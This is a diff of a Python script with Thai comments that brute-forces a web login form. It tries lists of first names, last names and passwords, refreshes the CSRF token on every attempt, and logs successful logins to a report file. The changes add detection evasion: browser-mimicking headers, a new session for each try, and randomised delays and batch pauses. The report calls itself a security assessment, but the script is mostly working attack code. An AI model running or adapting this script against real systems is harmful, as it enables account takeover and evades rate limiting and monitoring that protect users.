@@ -9,11 +9,12 @@ from datetime import datetime
 # 1. โหลด environment variables
 load_dotenv()
 
-# 2. กำหนด URL จาก .env
-base_url = os.getenv('BASE_URL')
-login_url = f"{base_url}{os.getenv('LOGIN_URL')}"
+# 2. กำหนด URL จาก .env หรือใช้ค่าเริ่มต้น
+base_url = os.getenv('BASE_URL', 'http://localhost:5000')  # เพิ่มค่าเริ่มต้น
+login_url = f"{base_url}{os.getenv('LOGIN_URL', '/login')}"  # เพิ่มค่าเริ่มต้น
 
 print(f"🌐 ใช้ URL: {base_url}")
+print(f"🔗 Login URL: {login_url}")
 print("-" * 50)
 
 # 3. เริ่ม session เพื่อเก็บ cookies
@@ -21,7 +22,12 @@ session = requests.Session()
 
 # ใช้ User-Agent แบบง่ายๆ เพื่อหลีกเลี่ยงการตรวจจับ
 session.headers.update({
-    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1'
 })
 
 # 4. โหลดหน้า login เพื่อนำ CSRF Token
@@ -45,11 +51,7 @@ try:
             input_name = input_field.get('name', 'ไม่มีชื่อ')
             input_type = input_field.get('type', 'text')
             print(f"   {i}. Name: {input_name}, Type: {input_type}")
-        
-        # บันทึก HTML ลงไฟล์เพื่อตรวจสอบ
-        with open('debug_response.html', 'w', encoding='utf-8') as f:
-            f.write(response.text)
-        print("💾 บันทึก HTML ลงไฟล์ debug_response.html แล้ว")
+
         
         exit()
         
@@ -100,23 +102,34 @@ successful_logins = []  # เก็บข้อมูลที่ login สำ�
 start_time = datetime.now()  # บันทึกเวลาเริ่มต้น
 
 # ตั้งค่าการหน่วงเวลา
-MIN_DELAY = 0.5  # หน่วงขั้นต่ำ 1 วินาที
-MAX_DELAY = 2.0  # หน่วงสูงสุด 3 วินาที
-BATCH_SIZE = 15   # ทดสอบ 5 ครั้งแล้วหยุดพักนาน
-BATCH_DELAY = 5.0  # หยุดพัก 5 วินาทีหลังทดสอบ 5 ครั้ง
+MIN_DELAY = 1.0  # หน่วงขั้นต่ำ 1 วินาที
+MAX_DELAY = 5.0  # หน่วงสูงสุด 5 วินาที
+BATCH_SIZE = 10   # ทดสอบ 10 ครั้งแล้วหยุดพักนาน
+BATCH_DELAY = 20.0  # หยุดพัก 20 วินาทีหลังทดสอบ 10 ครั้ง
+CSRF_REFRESH_INTERVAL = 1  # ดึง CSRF token ใหม่ทุกครั้ง
 
 # เริ่มที่ password ก่อน (outer loop)
 for password in passwords:
     print(f"\n🔐 ทดสอบรหัสผ่าน: {password}")
     print("=" * 40)
     
-    # fname และ lname ต้องสัมพันธ์กัน (แถวที่ 1 คู่กับแถวที่ 1)
     for i in range(len(fnames)):
-        if i < len(lnames):  # ตรวจสอบว่ามี lname ครบหรือไม่
+        if i < len(lnames):
             fname = fnames[i]
             lname = lnames[i]
             attempt_count += 1
-            
+
+            # Reset session ทุกครั้งที่วนลูป
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1'
+            })
+
             # ตรวจสอบการหยุดพักหลังทดสอบหลายครั้ง
             if attempt_count % BATCH_SIZE == 0:
                 print(f"🛑 หยุดพักหลังทดสอบ {BATCH_SIZE} ครั้ง...")
@@ -124,37 +137,75 @@ for password in passwords:
                 time.sleep(BATCH_DELAY)
                 print("▶️ เริ่มทดสอบต่อ...")
                 print("-" * 30)
-            
+
             print(f"🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")
-            
+
+            # ดึง CSRF Token ใหม่
+            print(f"🔄 ดึง CSRF Token ใหม่ (ครั้งที่ {attempt_count})...")
+            try:
+                login_page_response = session.get(login_url)
+                print(f"URL ที่ได้: {login_page_response.url}")
+                if not login_page_response.url.endswith('/login'):
+                    print("❌ ไม่ได้อยู่ที่หน้า /login อาจโดน redirect")
+                    continue
+                login_soup = BeautifulSoup(login_page_response.text, 'html.parser')
+                csrf_input = login_soup.find('input', {'name': '__RequestVerificationToken'})
+                if not csrf_input:
+                    print("❌ ไม่พบ CSRF Token ใหม่")
+                    continue
+                csrf_token = csrf_input['value']
+                print(f"🔑 CSRF Token ใหม่: {csrf_token[:20]}...")
+            except Exception as e:
+                print(f"❌ ไม่สามารถดึง CSRF Token ใหม่ได้: {e}")
+                continue
+
             # เตรียมข้อมูลสำหรับ POST
             login_data = {
                 '__RequestVerificationToken': csrf_token,
-                'fname': fname,
-                'lname': lname,
-                'password': password
+                'FName': fname,
+                'LName': lname,
+                'Password': password
             }
-            
+
             # ส่ง POST ไปยังฟอร์ม login
-            post_response = session.post(login_url, data=login_data)
-            
-            # ตรวจสอบผลลัพธ์
-            if post_response.text.strip().lower() == "true":
-                print("✅ Login สำเร็จ (ระบบตอบ true)")
-                success_count += 1
-                successful_logins.append({
-                    'attempt': attempt_count,
-                    'fname': fname,
-                    'lname': lname,
-                    'password': password,
-                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                })
-            else:
-                print("❌ Login ล้มเหลว (ระบบตอบ false)")
-            
+            try:
+                post_response = session.post(login_url, data=login_data)
+                print(f"📡 POST Response Status: {post_response.status_code}")
+                print(f"📍 POST Response URL: {post_response.url}")
+                print(f"📡 POST Data: {login_data}")
+
+                # ตรวจสอบ response headers
+                if 'Set-Cookie' in post_response.headers:
+                    print("🍪 ได้รับ cookies ใหม่")
+
+                # ตรวจสอบผลลัพธ์
+                response_text = post_response.text.strip()
+                print(f"📄 Response Text: {response_text[:200]}...")
+
+                if response_text.lower() == "true":
+                    print("✅ Login สำเร็จ (ระบบตอบ true)")
+                    success_count += 1
+                    successful_logins.append({
+                        'attempt': attempt_count,
+                        'fname': fname,
+                        'lname': lname,
+                        'password': password,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    })
+                else:
+                    print("❌ Login ล้มเหลว (ระบบตอบ false)")
+
+            except Exception as e:
+                print(f"❌ เกิดข้อผิดพลาดในการส่ง POST: {e}")
+                try:
+                    with open(f'error_response_{attempt_count}.html', 'w', encoding='utf-8') as f:
+                        f.write(post_response.text if 'post_response' in locals() else str(e))
+                    print(f"💾 บันทึก error response ลงไฟล์ error_response_{attempt_count}.html")
+                except:
+                    pass
+
             # หยุดพักเล็กน้อยเพื่อไม่ให้ server รับภาระมากเกินไป
-            # ใช้เวลาหน่วงแบบสุ่มเพื่อหลีกเลี่ยงการตรวจจับ
-            delay = random.uniform(MIN_DELAY, MAX_DELAY)  # หน่วง 2-5 วินาที
+            delay = random.uniform(MIN_DELAY, MAX_DELAY)
             print(f"⏳ หน่วงเวลา {delay:.1f} วินาที...")
             time.sleep(delay)
             print("-" * 30)
@@ -174,9 +225,13 @@ print(f"   - ระยะเวลาที่ใช้: {duration}")
 print("=" * 50)
 print("🎯 การทดสอบเสร็จสิ้น!")
 
-# 9. บันทึกผลลัพธ์ลงไฟล์ result.txt ในรูปแบบ log 
+# 9. บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt ในรูปแบบ log 
 def save_results_to_log():
-    """บันทึกผลลัพธ์ลงไฟล์ result.txt ในรูปแบบ log"""
+    """บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt ในรูปแบบ log"""
+    
+    # ป้องกัน ZeroDivisionError
+    success_rate = (success_count/attempt_count*100) if attempt_count > 0 else 0
+    avg_time = (duration.total_seconds()/attempt_count) if attempt_count > 0 else 0
     
     # สร้างเนื้อหา log
     log_content = f"""
@@ -192,7 +247,7 @@ EXECUTION DETAILS:
     Total Attempts: {attempt_count}
     Successful Logins: {success_count}
     Failed Attempts: {attempt_count - success_count}
-    Success Rate: {(success_count/attempt_count*100):.2f}%
+    Success Rate: {success_rate:.2f}%
 
 ATTACK PARAMETERS:
     FName Records: {len(fnames)}
@@ -228,14 +283,14 @@ ATTACK STATISTICS:
     | Total Attempts         | {attempt_count:8d} |
     | Successful Logins      | {success_count:8d} |
     | Failed Attempts        | {attempt_count - success_count:8d} |
-    | Success Rate           | {(success_count/attempt_count*100):7.2f}% |
-    | Average Time per Test  | {(duration.total_seconds()/attempt_count):7.2f}s |
+    | Success Rate           | {success_rate:7.2f}% |
+    | Average Time per Test  | {avg_time:7.2f}s |
     +------------------------+----------+
 
 SECURITY ASSESSMENT:
     Risk Level: {'HIGH' if success_count > 0 else 'LOW'}
     Vulnerable Accounts: {success_count}
-    Attack Effectiveness: {(success_count/attempt_count*100):.2f}%
+    Attack Effectiveness: {success_rate:.2f}%
     Recommendations: {'Immediate password policy review required' if success_count > 0 else 'Current security measures appear effective'}
 
 ================================================================================
@@ -246,9 +301,9 @@ REPORT GENERATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
     
     # บันทึกลงไฟล์ (append mode)
     try:
-        with open('result.txt', 'a', encoding='utf-8') as f:
+        with open('brute_force_results.txt', 'a', encoding='utf-8') as f:
             f.write(log_content)
-        print("💾 บันทึกผลลัพธ์ลงไฟล์ result.txt แล้ว")
+        print("💾 บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt แล้ว")
     except Exception as e:
         print(f"❌ ไม่สามารถบันทึกผลลัพธ์ได้: {e}")
 
